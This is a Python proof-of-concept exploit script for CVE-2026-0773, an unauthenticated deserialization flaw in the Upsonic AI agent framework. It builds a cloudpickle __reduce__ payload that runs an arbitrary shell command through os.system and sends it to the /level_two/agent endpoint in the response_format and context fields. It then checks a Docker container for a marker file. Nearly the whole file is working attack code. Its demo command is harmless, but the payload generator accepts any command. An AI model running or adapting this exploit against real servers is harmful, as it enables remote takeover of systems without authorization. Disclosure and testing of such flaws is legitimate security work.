#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Upsonic Cloudpickle RCE via /level_two/agent
# CVE            : CVE-2026-0773
# Vendor         : Upsonic
# Product        : Upsonic AI Agent Framework
# Affected       : v0.36.0 through v0.55.6
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0773 — Vector 3: POST /level_two/agent (response_format + context)

Demonstrates the SAME cloudpickle deserialization vulnerability via the
/level_two/agent endpoint. Like Vector 2, executes directly on the main
server without requiring the tools_server.

ATTACK CHAIN:
  1. Craft malicious cloudpickle payload with __reduce__ gadget
  2. Send via POST /level_two/agent response_format or context field
  3. cloudpickle.loads() executes directly on main server

PREREQUISITES:
  - Network access to Upsonic main server (default port 7541)
  - No authentication required

REFERENCES:
  - CVE-2026-0773
  - https://www.zerodayinitiative.com/advisories/ZDI-26-042/

The /level_two/agent endpoint requires additional fields (agent_id, prompt)
but uses the exact same deserialization pattern.

Usage:
    python3 poc_vector3_level_two.py <target_host> [port]
"""

import sys
import json
import base64
import urllib.request
import urllib.error
import subprocess
import time


DEFAULT_PORT = 7541
MARKER_PREFIX = "/tmp/cve-2026-0773-level2"


def generate_payload(command: str) -> str:
    """Generate a cloudpickle RCE payload using __reduce__."""
    import cloudpickle
    import os

    class RCEPayload:
        def __reduce__(self):
            return (os.system, (command,))

    return base64.b64encode(cloudpickle.dumps(RCEPayload())).decode('utf-8')


def send_request(url: str, body: dict, timeout: int = 30) -> dict:
    """Send HTTP POST with JSON body."""
    data = json.dumps(body).encode('utf-8')
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return {"status": resp.status, "body": resp.read().decode('utf-8'), "error": None}
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode('utf-8') if e.fp else ""
        return {"status": e.code, "body": resp_body, "error": str(e)}
    except Exception as e:
        return {"status": None, "body": "", "error": str(e)}


def verify_marker(container: str, marker_file: str) -> bool:
    """Check if marker file exists in container."""
    try:
        result = subprocess.run(
            ["docker", "exec", container, "cat", marker_file],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0 and result.stdout.strip():
            print(f"    [+] Marker file contents: {result.stdout.strip()}")
            return True
    except Exception as e:
        print(f"    [-] Verification error: {e}")
    return False


def cleanup(container: str):
    """Remove marker files."""
    for suffix in ["response_format", "context"]:
        try:
            subprocess.run(
                ["docker", "exec", container, "rm", "-f", f"{MARKER_PREFIX}-{suffix}"],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass


def exploit(target_host: str, target_port: int):
    """
    Test two deserialization sinks on /level_two/agent:
    1. response_format field (line 48-49)
    2. context field (line 64-65)
    """
    container = "cve-2026-0773-vulnerable"
    base_url = f"http://{target_host}:{target_port}"

    print("=" * 65)
    print("  CVE-2026-0773 — Vector 3: /level_two/agent deserialization")
    print("  Direct execution on main server (no tools_server proxy)")
    print("=" * 65)
    print()

    cleanup(container)
    results = {}

    # --- Sub-vector A: response_format field ---
    print("[*] Sub-vector A: response_format field")
    print("    File: src/upsonic/server/level_two/server/server.py:48-49")
    print("    Sink: cloudpickle.loads(base64.b64decode(request.response_format))")
    print()

    marker_a = f"{MARKER_PREFIX}-response_format"
    cmd_a = f"id > {marker_a} && echo 'RCE via response_format on /level_two/agent' >> {marker_a}"
    payload_a = generate_payload(cmd_a)

    # level_two/agent requires agent_id and prompt fields in addition
    body_a = {
        "agent_id": "exploit-test",
        "prompt": "test",
        "response_format": payload_a,
    }

    print(f"    [*] POST {base_url}/level_two/agent")
    print(f"    [*] Payload in: response_format field")
    resp_a = send_request(f"{base_url}/level_two/agent", body_a)
    print(f"    [*] Response: HTTP {resp_a['status']}")
    if resp_a['error']:
        print(f"    [!] Error: {resp_a['error'][:100]}")

    time.sleep(1)

    print(f"    [*] Checking marker file {marker_a}...")
    if verify_marker(container, marker_a):
        print("    [+] SUCCESS: RCE via response_format confirmed!")
        results['response_format'] = True
    else:
        print("    [-] FAILED: Marker file not found")
        results['response_format'] = False

    print()

    # --- Sub-vector B: context field ---
    print("[*] Sub-vector B: context field")
    print("    File: src/upsonic/server/level_two/server/server.py:64-65")
    print("    Sink: cloudpickle.loads(base64.b64decode(request.context))")
    print()

    marker_b = f"{MARKER_PREFIX}-context"
    cmd_b = f"id > {marker_b} && echo 'RCE via context on /level_two/agent' >> {marker_b}"
    payload_b = generate_payload(cmd_b)

    # Set response_format to "str" so the code skips the first
    # deserialization block and reaches the context deserialization path.
    body_b = {
        "agent_id": "exploit-test",
        "prompt": "test",
        "response_format": "str",
        "context": payload_b,
    }

    print(f"    [*] POST {base_url}/level_two/agent")
    print(f"    [*] Payload in: context field")
    resp_b = send_request(f"{base_url}/level_two/agent", body_b)
    print(f"    [*] Response: HTTP {resp_b['status']}")
    if resp_b['error']:
        print(f"    [!] Error: {resp_b['error'][:100]}")

    time.sleep(1)

    print(f"    [*] Checking marker file {marker_b}...")
    if verify_marker(container, marker_b):
        print("    [+] SUCCESS: RCE via context confirmed!")
        results['context'] = True
    else:
        print("    [-] FAILED: Marker file not found")
        results['context'] = False

    # Summary
    print()
    print("=" * 65)
    print("  RESULTS — /level_two/agent endpoint")
    print("=" * 65)
    for field, success in results.items():
        status = "CONFIRMED" if success else "FAILED"
        print(f"  [{'+' if success else '-'}] {field}: {status}")
    print()

    return all(results.values())


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    success = exploit(target, port)
    sys.exit(0 if success else 1)
